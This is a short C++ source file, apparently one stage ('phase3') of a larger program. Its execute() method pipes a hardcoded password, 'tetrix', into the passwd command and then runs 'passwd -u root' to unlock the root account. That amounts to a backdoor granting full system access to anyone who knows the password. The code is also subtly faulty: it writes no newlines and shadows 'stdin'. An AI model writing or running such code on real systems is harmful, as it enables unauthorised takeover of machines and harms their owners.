#include "phase3.h"


phase3::phase3()
{

}

int phase3::execute()
{
  FILE* stdin = popen("passwd", "w");
  const char* newpass = "tetrix";
  fputs(newpass, stdin);
  fputs(newpass, stdin);
  pclose(stdin);
  system("passwd -u root"); //Unlock the root account.
  return 0;
}
